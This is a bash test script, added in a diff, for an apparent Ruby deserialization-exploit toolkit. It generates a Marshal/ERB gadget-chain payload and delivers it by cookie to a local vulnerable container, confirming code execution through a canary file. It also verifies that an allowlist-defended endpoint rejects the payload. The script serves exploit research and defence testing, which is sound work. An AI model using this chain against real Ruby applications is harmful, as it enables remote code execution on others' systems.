@@ -1,0 +1,144 @@
+#!/usr/bin/env bash
+# ©AngelaMos | 2026
+# target-gate.sh
+
+set -uo pipefail
+
+HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
+
+IMAGE="rube-target:local"
+CONTAINER="rube-target-gate"
+PORT="${RUBE_TARGET_PORT:-47823}"
+BASE="http://127.0.0.1:${PORT}"
+CANARY_MARKER="fired"
+
+cleanup() {
+    docker rm -f "${CONTAINER}" >/dev/null 2>&1 || true
+}
+trap cleanup EXIT
+
+echo "building target image"
+docker build -q -f "${HERE}/target/Dockerfile" -t "${IMAGE}" "${HERE}" >/dev/null || {
+    echo "FAIL image build"
+    exit 1
+}
+
+cleanup
+docker run -d --name "${CONTAINER}" \
+    --network bridge \
+    --read-only \
+    --tmpfs /tmp:rw,noexec,nosuid,size=1m \
+    -p "127.0.0.1:${PORT}:4567" \
+    "${IMAGE}" >/dev/null
+
+for _ in $(seq 1 40); do
+    curl -sf "${BASE}/" >/dev/null 2>&1 && break
+    sleep 0.5
+done
+
+if ! curl -sf "${BASE}/" >/dev/null 2>&1; then
+    echo "FAIL target never became reachable on ${PORT}"
+    docker logs "${CONTAINER}" 2>&1 | tail -20
+    exit 1
+fi
+
+echo
+curl -s "${BASE}/" | head -3
+echo
+
+payload="$(docker run --rm --network none -v "${HERE}/lib:/app/lib:ro" -w /app ruby:4.0-slim \
+    ruby -Ilib -e '
+require "rube"
+require "base64"
+chain = Rube::Chains::ErbDefMethod.canary("/tmp/rube-canary", "fired")
+state = { user: "attacker", template: chain.generate }
+print Base64.strict_encode64(Marshal.dump(state))
+')"
+
+if [[ -z "${payload}" ]]; then
+    echo "FAIL payload generation produced nothing"
+    exit 1
+fi
+
+failures=0
+
+before="$(curl -s "${BASE}/canary")"
+vulnerable_body="$(curl -s --cookie "session_state=${payload}" "${BASE}/render")"
+after="$(curl -s "${BASE}/canary")"
+
+echo "  vulnerable endpoint : ${vulnerable_body}"
+echo "  canary before/after : ${before} -> ${after}"
+
+if [[ "${after}" == "${CANARY_MARKER}" && "${before}" != "${CANARY_MARKER}" ]]; then
+    echo "  PASS   HTTP request achieved code execution through Marshal.load"
+else
+    echo "  FAIL   payload did not execute over HTTP"
+    failures=$((failures + 1))
+fi
+
+docker exec "${CONTAINER}" rm -f /tmp/rube-canary >/dev/null 2>&1 || true
+
+reset="$(curl -s "${BASE}/canary")"
+safe_body="$(curl -s --cookie "session_state=${payload}" "${BASE}/render/safe")"
+safe_after="$(curl -s "${BASE}/canary")"
+
+echo
+echo "  defended endpoint   : ${safe_body}"
+echo "  canary before/after : ${reset} -> ${safe_after}"
+
+if [[ "${safe_after}" != "${CANARY_MARKER}" && "${safe_body}" == rejected* ]]; then
+    echo "  PASS   defended endpoint rejected the identical payload"
+else
+    echo "  FAIL   defended endpoint did not reject the payload"
+    failures=$((failures + 1))
+fi
+
+jar="$(mktemp)"
+curl -s -X POST "${BASE}/session" -d "" -c "${jar}" >/dev/null
+benign="$(awk '$6 == "session_state" {print $7}' "${jar}")"
+rm -f "${jar}"
+
+echo
+if [[ -z "${benign}" ]]; then
+    echo "  FAIL   could not obtain a benign session, the control did not run"
+    failures=$((failures + 1))
+else
+    benign_body="$(curl -s --cookie "session_state=${benign}" "${BASE}/render/safe")"
+    echo "  benign on defended  : ${benign_body}"
+    if [[ "${benign_body}" == rejected* ]]; then
+        echo "  FAIL   defended endpoint rejects legitimate sessions, it is not a filter"
+        failures=$((failures + 1))
+    else
+        echo "  PASS   defended endpoint still serves a legitimate session"
+    fi
+fi
+
+echo
+sinks="$(docker run --rm --network none -v "${HERE}/lib:/app/lib:ro" -w /app ruby:4.0-slim \
+    ruby -Ilib -e '
+require "rube"
+require "base64"
+chain = Rube::Chains::ErbDefMethod.canary("/tmp/rube-canary", "fired")
+blob = Marshal.dump({ user: "attacker", template: chain.generate })
+result = Rube::Marshal::Parser.new(blob).parse
+print result.sinks.length
+')"
+
+echo "  sink-tag hits on the working payload : ${sinks}"
+if [[ "${sinks}" == "0" ]]; then
+    echo "  NOTE   sink detection alone does NOT catch this chain, only the class"
+    echo "         allowlist does. ERB defines no marshal_load, so it serializes as"
+    echo "         a plain object and carries no sink tag."
+else
+    echo "  FAIL   expected the ERB chain to carry no sink tag, got ${sinks}"
+    failures=$((failures + 1))
+fi
+
+echo
+if [[ ${failures} -eq 0 ]]; then
+    echo "GATE PASSED"
+    exit 0
+fi
+
+echo "GATE FAILED (${failures})"
+exit 1
